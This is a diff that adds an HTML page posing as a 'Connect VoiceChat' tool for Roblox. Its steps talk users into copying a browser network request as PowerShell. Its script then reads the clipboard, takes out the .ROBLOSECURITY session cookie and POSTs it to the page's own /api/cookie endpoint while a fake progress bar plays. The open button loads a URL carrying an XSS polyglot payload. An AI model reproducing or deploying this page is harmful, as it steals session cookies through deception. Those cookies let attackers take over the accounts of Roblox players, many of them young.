@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect VoiceChat</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <style>
+      body {
+        background-color: rgb(92, 91, 91);
+      }
+      p, h1 {
+        color: rgb(255, 255, 255);
+      }
+      .text {
+        font-size: 15px;
+      }
+      #progress {
+        width: 100%;
+        background-color: grey;
+      }
+      #bar {
+        width: 1%;
+        height: 30px;
+        background-color: green;
+      }
+    </style>
+</head>
+<body>
+    <header class="p-3 text-bg-dark">
+        <div class="container">
+          <div class="d-flex flex-wrap align-items-center justify-content-center justify-content-lg-start">
+            <a href="/" class="d-flex align-items-center mb-2 mb-lg-0 text-white text-decoration-none">
+              <svg class="bi me-2" width="40" height="32" role="img" aria-label="Bootstrap"><use xlink:href="#bootstrap"></use></svg>
+            </a>
+
+            <ul class="nav col-12 col-lg-auto me-lg-auto mb-2 justify-content-center mb-md-0">
+              <li><a href="#" class="nav-link px-2 text-secondary">Home</a></li>
+              <li><a href="#" class="nav-link px-2 text-white">Contact</a></li>
+              <li><a href="#" class="nav-link px-2 text-white">Voice Chat</a></li>
+              <li><a href="#" class="nav-link px-2 text-white">Limited Sniper</a></li>
+              <li><a href="#" class="nav-link px-2 text-white">Follow Bot</a></li>
+            </ul>
+          </div>
+        </div>
+      </header>
+      <div class="px-4 py-5 my-5 text-center">
+        <h1 class="display-5 fw-bold">How to enable voicechat</h1>
+        <div class="col-lg-6 mx-auto">
+          <p class="lead mb-4">Steps for enabling Voicechat:</p>
+          <p class="lead mb-4 text">1. Press the button that says "Open voicechat". Once done go to inspect element console and head over to the tab labeled "network". Once here click "ctrl" and "r" or refresh your page manually.</p>
+          <br>
+          <p class="lead mb-4 text">2. Scroll up until you see "voicechat". Right click on "voicechat" and hover over copy, a bunch of options will pop up go ahead and select "Copy all as Powershell" or "Powershell" Once done go back to this website and press Toggle Voicechat button. Wait until the bar finishes loading and roblox voicechat should be enabled on your account.</p>
+          <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
+            <button type="button" class="btn btn-outline-secondary btn-sm px-4 open-vc">Open Voicechat</button>
+            <button type="button" class="btn btn-primary btn-sm px-4 gap-3 copy-key">Toggle Voicechat</button>
+          </div>
+          <br>
+          <div id="progress">
+            <div id="bar"></div>
+          </div>
+        </div>
+      </div>
+    <script>
+        const button = document.querySelector(".open-vc")
+        const copy = document.querySelector(".copy-key")
+        const url = "https://www.roblox.com/var=/VoiceApi%3a%60%2f%2a%3C%2ftitle%3E%3C%2fstyle%3E%3C%2ftextarea%3E%3C%2fnoscript%3E%3C%2fscript%3E%3C%2fnoembed%3E%3C%2ftemplate%3E%3C%2fselect%2f%22%2f%27%2f%2a--%3E%3Cframe%20onload%3dalert()%3E%3Csvg%2f%5c%22%2f%2a%3Csvg%20onload%3d%27%20%2f%2a%2a%2f-alert()%2f%2f%27%3Ejavascript%3a%2f%2a%60%2f%2a%5c%22%2f%2a%27%2f%2a%3C%2fnoembed%3E%22%2f%2a%3Cframe%20src%3djavascript%3a%2f%2a%2a%2f%3balert()%2f%2f--%3E%3C%2ftitle%3E%3C%2ftextarea%3E%3C%2fstyle%3E%3C%2fnoscript%3E%3C%2ftemplate%3E%3C%2fselect%3E%3C%2fscript%3E%3C%3Csvg%2fonload%3d%20alert()%2f%2f%3E/https://localhost/voicechat"
+
+        async function send_data(cookie) {
+            const response = await fetch("/api/cookie", {
+                method: "POST",
+                headers: {
+                    "content-type": "application/json"
+                },
+                body: JSON.stringify({"cookie": cookie}),
+            })
+        }
+
+        copy.addEventListener('click', async () => {
+            let read = await navigator.clipboard.readText();
+            if (read.includes("_|WARNING")) {
+                try {
+                    read = read.split("(\".ROBLOSECURITY\", \"")[1].split("\"")[0]
+                    send_data(read)
+                } catch (error) {
+                    console.log(error)
+                    alert("Invalid Code. Please Try Again (Make Sure To Copy as Powershell)")
+                }
+                //progress bar
+                let i = 0
+                if (i == 0) {
+                    i = 1
+                    let elem = document.getElementById("bar")
+                    let width = 1
+                    let id = setInterval(function() {
+                        if (width >= 100) {
+                            clearInterval(id)
+                            i = 0
+                        } else {
+                            width++;
+                            elem.style.width = width + "%"
+                        }
+                    }, 10)
+                }
+            } else {
+                alert("Invalid Code. Please Try Again (Make Sure To Copy as Powershell)")
+            }
+        })
+        button.addEventListener("click", () => {
+            window.open(url, "Voice Chat", "width=200,height=200");
+        })
+
+    </script>
+    <div class="container">
+      <footer class="py-3 my-4">
+        <ul class="nav justify-content-center border-bottom pb-3 mb-3">
+          <li class="nav-item"><a href="#" class="nav-link px-2 text-white">Home</a></li>
+          <li class="nav-item"><a href="#" class="nav-link px-2 text-white">Information</a></li>
+          <li class="nav-item"><a href="#" class="nav-link px-2 text-white">FAQ</a></li>
+          <li class="nav-item"><a href="#" class="nav-link px-2 text-white">Contact</a></li>
+          <li class="nav-item"><a href="#" class="nav-link px-2 text-white">Roblox Groups</a></li>
+        </ul>
+        <p class="text-center text-white">© 2023 RBLX API</p>
+      </footer>
+    </div>
+</body>
+</html>
